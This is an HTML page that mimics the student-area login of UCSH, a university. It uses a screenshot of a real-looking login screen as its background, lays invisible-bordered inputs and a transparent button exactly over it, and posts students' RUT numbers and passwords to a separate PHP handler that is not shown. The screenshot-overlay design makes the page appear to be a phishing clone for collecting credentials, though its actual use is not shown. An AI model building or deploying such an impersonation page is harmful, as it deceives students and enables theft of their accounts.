<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Acceso Zona Estudiantes - UCSH</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
        }

        /* Banner Superior (puedes ajustar la ruta de tu imagen de banner) */
        .banner-container {
            width: 100%;
            height: 90px;
            background-image: url('assets/img/Captura de pantalla 2026-07-27 151712.png');
            background-repeat: no-repeat;
            background-size: cover;
            position: relative;
        }

        /* Contenedor de la sección central con la imagen de login de fondo */
        .login-section {
            width: 950px;
            height: 520px;
            margin: 20px auto;
            background-image: url('assets/img/login-fondo.png'); /* Tu imagen del edificio y caja de acceso */
            background-repeat: no-repeat;
            background-position: center;
            position: relative;
            background-color: #ffffff; /* Respaldo en caso de que cargue lento */
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }

        /* 
          Capa contenedora para alinear los inputs exactamente 
          sobre las cajas de texto blancas que se ven en la imagen de login.
        */
        .login-inputs-overlay {
            position: absolute;
            top: 360px;  /* Ajusta esta coordenada vertical si es necesario */
            left: 575px; /* Ajusta esta coordenada horizontal si es necesario */
            display: flex;
            flex-direction: column;
            gap: 12px;
            width: 160px;
        }

        /* Estilo de los campos de texto para que coincidan con la interfaz */
        .login-inputs-overlay input {
            width: 100%;
            height: 18px;
            padding: 2px 4px;
            font-size: 11px;
            border: 1px solid #7f9db9;
            background-color: #ffffff;
            font-family: Arial, sans-serif;
            outline: none;
        }

        .login-inputs-overlay input:focus {
            border-color: #3399ff;
        }

        /* Botón Ingresar transparente o superpuesto */
        .btn-ingresar {
            position: absolute;
            top: 435px;
            left: 615px;
            width: 75px;
            height: 22px;
            background: transparent;
            border: none;
            cursor: pointer;
        }

        /* Enlace ¿olvidó su clave? */
        .link-recuperar {
            position: absolute;
            top: 468px;
            left: 560px;
            font-size: 10px;
            color: #003366;
            text-decoration: none;
        }

        .link-recuperar:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <!-- Banner Institucional Superior -->
    <div class="banner-container"></div>

    <!-- Sección de Login con Imagen de Fondo e Inputs Interactivos -->
    <div class="login-section">
        
        <!-- Formularios interactivos posicionados exactamente encima de la imagen -->
        <form action="procesar_login.php" method="POST">
            
            <div class="login-inputs-overlay">
                <!-- Campo RUT -->
                <input type="text" name="rut" placeholder="Ej.: 12345678" required autocomplete="off">
                
                <!-- Campo Clave -->
                <input type="password" name="clave" placeholder="Ingrese su password" required>
            </div>

            <!-- Botón de Ingresar clickeable -->
            <button type="submit" class="btn-ingresar" title="Ingresar"></button>

            <!-- Enlace de recuperación -->
            <a href="#" class="link-recuperar">¿olvidó su clave?</a>

        </form>

    </div>

</body>
</html>
